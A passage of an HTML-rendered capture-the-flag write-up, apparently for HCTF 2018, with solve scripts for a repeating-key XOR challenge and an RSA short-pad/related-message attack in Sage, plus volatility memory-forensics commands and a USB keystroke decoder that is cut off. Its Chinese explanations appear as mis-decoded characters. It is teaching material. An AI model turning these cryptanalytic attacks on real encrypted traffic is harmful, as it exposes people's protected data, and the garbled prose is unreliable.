punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">"hctf{xxxxxxxxxxx}"</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'cipher.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>enc<span class="token punctuation">(</span>poem<span class="token punctuation">,</span> flag<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; ÈÄöËøáÁÆÄÂçïÂàÜÊûêÂÖ∂ÈÄªËæëÔºåÂèØ‰ª•Áü•ÈÅìxor_keyÂ∞±ÊòØflagËä±Êã¨Âè∑‰∏≠ÁöÑÂÜÖÂÆπÔºåÈÄöËøáËØ•xor_keyÂØπpoem.txt‰∏≠ÁöÑÂÜÖÂÆπËøõË°åÂä†ÂØÜÔºåÂπ∂‰∏îÈúÄË¶ÅÂØπÂ∫îÈïøÂ∫¶„ÄÇÂõ†‰∏∫poem.txt‰∏≠ÊòØ‰∏ÄÈ¶ñËØóÔºåËØó‰∏≠ÂèØËÉΩ‰ºöÂá∫Áé∞Â≠óÊØçÔºåÊï∞Â≠óÔºåÂºïÂè∑ÔºåÊç¢Ë°åÁ≠âÁ≠âÂêàÊ≥ïÂ≠óÁ¨¶ÔºåÁî±‰∫éÊàë‰ª¨Âè™ÊúâÂØÜÊñáÔºåÂπ∂‰∏îÁü•ÈÅìxorÁöÑËßÑÂæãÔºåÊòØxor_keyÁöÑÈïøÂ∫¶Êù•ÂÜ≥ÂÆöÁöÑÔºåÈÇ£‰πàÂ∞±ÂèØ‰ª•ÈÄöËøáÈÅçÂéÜÂä†‰∏äÁÆÄÂçïÁöÑÂà§Êñ≠ÔºåÂÜôÂá∫Â¶Ç‰∏ã‰ª£Á†Å(ËøôÊòØÊúÄÁÆÄÂçïÁöÑËß£Ê≥ïÔºåÂèÇÁÖß<a href="https://xz.aliyun.com/t/3257#toc-17" target="_blank" rel="noopener">ÁîµÂ≠êÁßëÂ§ßCNSSÊàòÈòüÁöÑwp</a> ÔºâÔºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#exp.py</span><span class="token keyword">import</span> base64<span class="token comment" spellcheck="true">#Ê£ÄÊµãÊòØÂê¶‰∏∫ËØóÊ≠åÊ≠£Â∏∏Â≠óÁ¨¶</span><span class="token keyword">def</span> <span class="token function">invalid</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> chr<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token string">'{}[]@#%^*=+'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token comment" spellcheck="true">#Êç¢Ë°åÁ¨¶‰∏∫Ê≠£Â∏∏Â≠óÁ¨¶</span>    <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> x <span class="token operator">&lt;=</span> <span class="token number">31</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> <span class="token boolean">False</span>cipher <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>open<span class="token punctuation">(</span><span class="token string">'cipher.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ÂèØËÉΩÁöÑxor_keyÈïøÂ∫¶</span><span class="token keyword">for</span> L <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    cc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#ÂØπxor_keyÁöÑÊØè‰∏Ä‰ΩçËøõË°åÊûö‰∏æ</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> cand <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token comment" spellcheck="true">#Ê≠•Èïø‰∏∫xor_keyÈïøÂ∫¶ÔºåËøõË°åÊµãËØï</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>i<span class="token punctuation">,</span> len<span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">,</span> L<span class="token punctuation">)</span><span class="token punctuation">:</span>                tmp <span class="token operator">=</span> cand <span class="token operator">^</span> cipher<span class="token punctuation">[</span>j<span class="token punctuation">]</span>                <span class="token comment" spellcheck="true">#Ëã•‰∏ç‰∏∫Ê≠£Â∏∏Â≠óÁ¨¶ÔºåÂàôÂ∞ÜflagÊ†áÂøó‰ΩçÁΩÆ‰∏∫False,‰∏ç‰ºöÂ∞ÜËØ•ascii‰Ωú‰∏∫ÂèØËÉΩÁöÑxor_keyÂ≠óÁ¨¶</span>                <span class="token keyword">if</span> invalid<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">:</span>                    flag <span class="token operator">=</span> <span class="token boolean">False</span>                    <span class="token keyword">break</span>            <span class="token comment" spellcheck="true">#Â∞ÜÁ¨¶ÂêàÊù°‰ª∂ÁöÑasciiÂØπÂ∫îÁöÑÂ≠óÁ¨¶Ê∑ªÂä†Âà∞ÂØπÂ∫îxor_keyÂ≠óÁ¨¶‰ΩçÁΩÆÁöÑÂàóË°®</span>            <span class="token keyword">if</span> flag<span class="token punctuation">:</span>                t<span class="token punctuation">.</span>append<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>cand<span class="token punctuation">)</span><span class="token punctuation">)</span>        c<span class="token punctuation">.</span>append<span class="token punctuation">(</span>len<span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span>        cc<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token number">0</span> <span class="token operator">not</span> <span class="token keyword">in</span> c<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span> c<span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>L<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> cc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>ËøêË°åÊïàÊûúÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113163611.png" alt=""></p><p>ËøôËôΩÁÑ∂‰∏çÊòØÊúÄÁ≤æÁ°ÆÁöÑÊñπÊ≥ïÔºå‰ΩÜÂèØ‰ª•ËØ¥ÊòØÁÆÄ‰æøÈ´òÊïà‰∫ÜÔºåËøòÊúâÂ∞±ÊòØÈÄöËøáxortoolÊù•ÁàÜÁ†¥keyÁöÑÈïøÂ∫¶Ôºå‰ª•ÂèäÂèØËÉΩÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇÊàñËÄÖÊü•Áúã<a href="https://xz.aliyun.com/t/3256#toc-22" target="_blank" rel="noopener">Ê±âÊòéÁ†ÅÂéüÁêÜ</a>„ÄÇ</p><p>ÈÄöËøáxortoolÁû¨Èó¥ÂæóÂà∞keyÈïøÂ∫¶ÊúÄÂèØËÉΩ‰∏∫21ÔºàËÆ∞ÂæóÂØÜÊñáÈúÄË¶ÅÊòØbase64Ëß£ÂØÜÂêéÁöÑÁúüÊ≠£ÂÜÖÂÆπÔºâÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113170451.png" alt=""></p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113172004.png" alt=""></p><p>ÁöÑÁ°ÆÂèØ‰ª•ÁúãÂà∞ÁàÜÁ†¥Âá∫Êù•ÁöÑkeyÂ§ßÂ§öÊï∞‰∏çÊàêÂΩ¢ÔºåÊØîËæÉÈöæÁåúÂá∫Ôºå‰∏çËøáÂæóÂà∞‰∫ÜkeyÁöÑÈïøÂ∫¶Â∞±ÊØîËæÉÁÆÄÂçï‰∫Ü„ÄÇ</p><h3 id="crypto2-Xor-RSA"><a href="#crypto2-Xor-RSA" class="headerlink" title="crypto2 - Xor?RSA"></a>crypto2 - Xor?RSA</h3><blockquote><p>ËøôÈ¢òÊ∂âÂèäÂà∞RSAÁöÑ‰∏ÄÁßçÊîªÂáªÊñπÂºèÔºöpaddingËøáÁü≠ÔºåÂèØ‰ª•Âà©Áî®Coppersmith‚Äôs short-pad attack„ÄÇ</p><p><a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">CTF‰∏≠RSAÂ∏∏ËßÅÊîªÂáªÊñπÊ≥ï</a></p><p><a href="https://www.anquanke.com/post/id/158944" target="_blank" rel="noopener">ÊµÖÊûêRSA Padding Attack-‰∏ÄÂè∂È£òÈõ∂</a></p><p>È¢òÁõÆÊ∫êÁ†ÅÔºö</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> SocketServer<span class="token keyword">import</span> string<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> random<span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">from</span> flag <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">class</span> <span class="token class-name">ThreadedTCPServer</span><span class="token punctuation">(</span>SocketServer<span class="token punctuation">.</span>ThreadingMixIn<span class="token punctuation">,</span> SocketServer<span class="token punctuation">.</span>TCPServer<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">class</span> <span class="token class-name">RSATCPHandler</span><span class="token punctuation">(</span>SocketServer<span class="token punctuation">.</span>BaseRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"Welcome to flag getting system\ngive me your token > "</span><span class="token punctuation">)</span>        token <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token operator">not</span> verify<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"token error\n"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            p <span class="token operator">=</span> getStrongPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            q <span class="token operator">=</span> getStrongPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            n <span class="token operator">=</span> p <span class="token operator">*</span> q            e <span class="token operator">=</span> <span class="token number">5</span>            nbits <span class="token operator">=</span> size<span class="token punctuation">(</span>n<span class="token punctuation">)</span>            kbits <span class="token operator">=</span> nbits <span class="token operator">//</span> <span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> e <span class="token operator">*</span> e<span class="token punctuation">)</span>            m1 <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span>nbits<span class="token punctuation">)</span>            m2 <span class="token operator">=</span> m1 <span class="token operator">^</span> getRandomNBitInteger<span class="token punctuation">(</span>kbits<span class="token punctuation">)</span>            c1 <span class="token operator">=</span> pow<span class="token punctuation">(</span>m1<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            c2 <span class="token operator">=</span> pow<span class="token punctuation">(</span>m2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"n="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"c1="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>c1<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"c2="</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>c2<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"now give me you answer\n"</span><span class="token punctuation">)</span>            ans1 <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            ans2 <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> str<span class="token punctuation">(</span>ans1<span class="token punctuation">)</span> <span class="token operator">==</span> str<span class="token punctuation">(</span>m1<span class="token punctuation">)</span> <span class="token operator">and</span> str<span class="token punctuation">(</span>ans2<span class="token punctuation">)</span> <span class="token operator">==</span> str<span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"wrong answer\n"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    HOST<span class="token punctuation">,</span> PORT <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> <span class="token number">10086</span>    server <span class="token operator">=</span> ThreadedTCPServer<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">,</span> RSATCPHandler<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre></blockquote><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113173105.png" alt=""></p><p>ËøôÁßçÁõÆÂâçÊØîËæÉÂ∏∏ËßÅÁöÑÂØÜÁ†ÅÂ≠¶Âá∫È¢òÊñπÂºèÔºå‰πãÂâç‰∏äÊµ∑Á¨¨ÂõõÂ±äÂ§ßÂ≠¶ÁîüÁΩëÁªúÂÆâÂÖ®Á´ûËµõ‰∏≠‰πüÊòØÁ±ª‰ººÁöÑÂΩ¢Âºè„ÄÇ</p><p>Ê†πÊçÆÁΩë‰∏äCoppersmith‚Äôs short-pad attackÁöÑsageËÑöÊú¨ËÆ°ÁÆóÂæóÂà∞m1,m2‰ªéËÄågetflag:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#.sageÊñá‰ª∂</span><span class="token keyword">def</span> <span class="token function">short_pad_attack</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PRxy<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token punctuation">,</span>y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    PRx<span class="token punctuation">.</span><span class="token operator">&lt;</span>xn<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    PRZZ<span class="token punctuation">.</span><span class="token operator">&lt;</span>xz<span class="token punctuation">,</span>yz<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    g1 <span class="token operator">=</span> x<span class="token operator">^</span>e <span class="token operator">-</span> c1    g2 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c2    q1 <span class="token operator">=</span> g1<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRZZ<span class="token punctuation">)</span>    q2 <span class="token operator">=</span> g2<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRZZ<span class="token punctuation">)</span>    h <span class="token operator">=</span> q2<span class="token punctuation">.</span>resultant<span class="token punctuation">(</span>q1<span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>univariate_polynomial<span class="token punctuation">(</span><span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>PRx<span class="token punctuation">)</span><span class="token punctuation">.</span>subs<span class="token punctuation">(</span>y<span class="token operator">=</span>xn<span class="token punctuation">)</span>    h <span class="token operator">=</span> h<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    kbits <span class="token operator">=</span> n<span class="token punctuation">.</span>nbits<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>e<span class="token operator">*</span>e<span class="token punctuation">)</span>    diff <span class="token operator">=</span> h<span class="token punctuation">.</span>small_roots<span class="token punctuation">(</span>X<span class="token operator">=</span><span class="token number">2</span><span class="token operator">^</span>kbits<span class="token punctuation">,</span> beta<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># find root &lt; 2^kbits with factor >= n^0.5</span>    <span class="token keyword">return</span> diff<span class="token keyword">def</span> <span class="token function">related_message_attack</span><span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> diff<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    PRx<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>Zmod<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>    g1 <span class="token operator">=</span> x<span class="token operator">^</span>e <span class="token operator">-</span> c1    g2 <span class="token operator">=</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>diff<span class="token punctuation">)</span><span class="token operator">^</span>e <span class="token operator">-</span> c2    <span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>g1<span class="token punctuation">,</span> g2<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> g2<span class="token punctuation">:</span>            g1<span class="token punctuation">,</span> g2 <span class="token operator">=</span> g2<span class="token punctuation">,</span> g1 <span class="token operator">%</span> g2        <span class="token keyword">return</span> g1<span class="token punctuation">.</span>monic<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token operator">-</span>gcd<span class="token punctuation">(</span>g1<span class="token punctuation">,</span> g2<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    n<span class="token operator">=</span> <span class="token number">27624787021478794432014046099044118472227462806689571877169321162341080400196594346396848700712193861439412465401252070834347447700123908992634057384897412386580543011772079685187452484482547314927927429951393092826148514141421284117787379461959985518410275689835704614842539327338694334290636840780333631465334614621493439746492265763855548204271205728089432042119353912134654280030097883942195750158943707581611175683875993347872617178472015419336030838097558714715441536192198290146161340547436590517299418585354071449344756659404775888056026765078595754225196944721648716610489001136659404706431278525745515104917</span>    c1<span class="token operator">=</span> <span class="token number">13776430024099427642531911099839128926564176154051949185623735493234122290060192171769692779077048350629609066059365476450358845203910684337231957918278447357520403549804467122983129527704870697355281794028641080624088689157548661997693776511974828120568864171878093764082280753662161625828078814197217819685649535298124739243813838247280440444870641299263032971398100048924255763139678843914805922076507098230791386720957494918572285270985306870181291182419426387424133256438320963476729846690659232164905237954666457813107525668584308246667410713493861547967072360028087639069471098558962062807871564380753429263871</span>    c2<span class="token operator">=</span> <span class="token number">657231109479430507699610101563647841801217640396116098068091897995892991211353444343972272978841494609004887673387698097902809034155415900362766044097098144261124986944336934366572328336651114328263543752730621658631527529933155522273669604895074397446129985885649878307733042032148247389310416198437240727964021932669979819481020837218701471923646557509580811764880281874944153918428434725834087434372596746861333346978776952856870040789444689376922826142208442257560964199238714914125845958146653319252684895614435672435449705706009355823637834574529488498832642357882290037365904913250435342395978044581644541358</span>    e <span class="token operator">=</span> <span class="token number">5</span>    diff <span class="token operator">=</span> short_pad_attack<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"difference of two messages is %d"</span> <span class="token operator">%</span> diff    m1 <span class="token operator">=</span> related_message_attack<span class="token punctuation">(</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> diff<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    m2 <span class="token operator">=</span> m1 <span class="token operator">+</span> diff    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> m1    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> pow<span class="token punctuation">(</span>m1<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span> c1    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> m2    <span class="token keyword">print</span> <span class="token string">"------"</span>    <span class="token keyword">print</span> pow<span class="token punctuation">(</span>m2<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span>    <span class="token keyword">print</span> c2</code></pre><p>sageÁéØÂ¢ÉÂèØ‰ª•Ëá™Â∑±ÂÆâË£ÖÔºå‰πüÂèØ‰ª•Âú®Á∫øËøêË°åÔºö<a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">https://sagecell.sagemath.org/</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><blockquote><p>ËøôÂá†ÈÅìmiscÊÑüËßâ‰πüÂßøÂäøÊª°Êª°Âë¢„ÄÇÊØîÂ¶ÇÂÜÖÂ≠òÂèñËØÅÔºåusbÊµÅÈáèÂàÜÊûê„ÄÇ</p></blockquote><h3 id="eazy-dump"><a href="#eazy-dump" class="headerlink" title="eazy_dump"></a>eazy_dump</h3><p>È¶ñÂÖàÈúÄË¶ÅÁü•ÈÅìËøôÊòØ‰∏Ä‰∏™ÈïúÂÉèÊñá‰ª∂ÔºåËÄåkali‰∏ãÈù¢ÁöÑvolatilityÂèØ‰ª•ËøõË°åÂÜÖÂ≠òÂèñËØÅÔºåÂèØ‰ª•ÂèÇËÄÉËøô‰∏ÄÁØáÊñáÁ´†Ôºö<a href="https://www.jianshu.com/p/6438bc3302c8" target="_blank" rel="noopener">CTFÂÜÖÂ≠òÂèñËØÅ</a></p><p>ÊâßË°åÂëΩ‰ª§<code>volatility -f mem.data imageinfo</code>ÂèØ‰ª•ÁúãÂà∞ÈïúÂÉè‰ø°ÊÅØÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113205904.png" alt=""></p><p><code>volatility -f mem.data --profile=Win2008R2SP0x64 pslist</code>Êü•ÁúãËøõÁ®ãÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113210854.png" class="lazyload"></p><p><code>**volatility -f mem.data --profile=Win2008R2SP0x64 -p [PID] -D [dump Âá∫ÁöÑÊñá‰ª∂‰øùÂ≠òÁöÑÁõÆÂΩï]**</code>ÂØºÂá∫ÊåáÂÆöËøõÁ®ãÊï∞ÊçÆÔºö</p><p>gimpÂèØ‰ª•ËØªÂèñ.dataÊñá‰ª∂Ôºå‰ªéÂéüÂßãÊï∞ÊçÆ‰∏≠ËΩΩÂÖ•ÂõæÂÉèÔºàÈúÄË¶ÅÊ≥®ÊÑèË∞ÉÊï¥ÁöÑÊòØÂÆΩÂ∫¶ÔºåËøô‰∏™ÊúÄÈáçË¶ÅÔºåÂΩìÂÆΩÂ∫¶‰∏∫1457Êó∂ÊúÄÊé•ËøëÂéüÂõæÔºåÁÑ∂ÂêéË∂äÂ§ßÂ∞±Ë∂ä‰∏çÂÆπÊòìÊâæÂà∞ÔºâÔºö</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113214227.png" class="lazyload"></p><h3 id="difficult-programming-language"><a href="#difficult-programming-language" class="headerlink" title="difficult programming language"></a>difficult programming language</h3><p>ÈÄöËøáÊèêÂèñÂπ∂‰∏îËß£ÂØÜusbÊµÅÈáèÂèØ‰ª•ÂæóÂà∞‰∏ÄÊÆµ malbolge ÁöÑ‰ª£Á†ÅÔºå‰πãÂâçÂú®‰∏≠ÁßëÂ§ßÊ†°Ëµõ‰∏äÈù¢‰πüÂÅöËøáüòÑ„ÄÇ</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181113205419.png" class="lazyload"></p><p>ÁÑ∂ÂêéÂèØ‰ª•google‰∏äÈù¢Êêú‰∏™ÁºñËØëÂô®ËøêË°å‰∏Ä‰∏ãÔºå‰∏çÂêåÁöÑÁºñËØëÂô®ÊïàÊûúÂèØËÉΩ‰∏ç‰∏ÄÊ†∑ÔºåÊúâÂèØËÉΩËøô‰∏™ÁºñËØëÂô®ÊúâÁî®ÔºåÂè¶Â§ñ‰∏Ä‰∏™Ê≤°Áî®„ÄÇ„ÄÇ</p><p>usbdecode.py:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#linux python2</span><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> osDataFileName <span class="token operator">=</span> <span class="token string">"usb.dat"</span>presses <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>normalKeys <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"04"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"05"</span><span class="token punctuation">:</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"06"</span><span class="token punctuation">:</span><span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"07"</span><span class="token punctuation">:</span><span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"08"</span><span class="token punctuation">:</span><span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">"09"</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"0a"</span><span class="token punctuation">:</span><span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"0b"</span><span class="token punctuation">:</span><span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token string">"0c"</span><span class="token punctuation">:</span><span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"0d"</span><span class="token punctuation">:</span><span class="token string">"j"</span><span class="token punctuation">,</span> <span class="token string">"0e"</span><span class="token punctuation">:</span><span class="token string">"k"</span><span class="token punctuation">,</span> <span class="token string">"0f"</span><span class="token punctuation">:</span><span class="token string">"l"</span><span class="token punctuation">,</span> <span class="token string">"10"</span><span class="token punctuation">:</span><span class="token string">"m"</span><span class="token punctuation">,</span> <span class="token string">"11"</span><span class="token punctuation">:</span><span class="token 